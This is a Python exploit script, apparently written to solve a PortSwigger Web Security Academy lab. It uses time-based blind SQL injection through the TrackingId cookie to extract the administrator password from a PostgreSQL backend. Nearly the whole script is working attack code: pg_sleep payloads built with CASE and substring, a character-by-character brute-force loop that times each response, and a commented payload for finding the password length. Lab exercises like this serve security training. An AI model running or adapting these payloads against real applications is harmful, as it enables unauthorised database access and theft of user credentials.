#!/usr/bin/env python3

# Blind SQL Injection - Time Based
# PortSwigger Web Security Academy
# This script automates the extraction of the administrator password
# using a time-based blind SQL injection technique (pg_sleep)
# Target DBMS: PostgreSQL
# Vulnerable parameter: TrackingId cookie

from pwn import log
import requests
import string
import time


# ATTACK CONFIGURATION


# Target lab URL 
TARGET_URL = "https://<lab-id>.web-security-academy.net"

# Valid session cookie 
SESSION_COOKIE = "<session_cookie>"

# Character set used for brute forcing
CHARSET = string.ascii_lowercase + string.digits

# Password length
# This value was obtained MANUALLY using a time-based SQLi
# payload such as:
# ; select case
#   when (username='administrator' and length(password)=20)
#   then pg_sleep(3)
#   else pg_sleep(0)
#   end from users-- -
#
# A delayed server response confirms the correct length.
# ---------------------------------------------------------
PASSWORD_LENGTH = 20

# VISUAL PROGRESS

p1 = log.progress("SQLi")
p2 = log.progress("Password")

def extract_password():
    """
    Extracts the administrator password character by character
    using time-based blind SQL injection.
    """

    password = ""

    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARSET:

            # Time-based SQL injection payload
            payload = (
                f"' ; select case when (username='administrator' "
                f"and substring(password,{position},1)='{char}') "
                f"then pg_sleep(3) else pg_sleep(0) end from users-- -"
            )

            # The TrackingId cookie is vulnerable and directly
            # concatenated into a backend SQL query
            cookies = {
                "TrackingId": f"test{payload}",
                "session": SESSION_COOKIE
            }

            p1.status(f"Testing position {position}: {char}")

            start = time.time()
            requests.get(TARGET_URL, cookies=cookies, timeout=10)
            elapsed = time.time() - start

            # If response time exceeds the threshold,
            # the guessed character is correct
            if elapsed > 2.5:
                password += char
                p2.status(password)
                break

if __name__ == "__main__":
    extract_password()
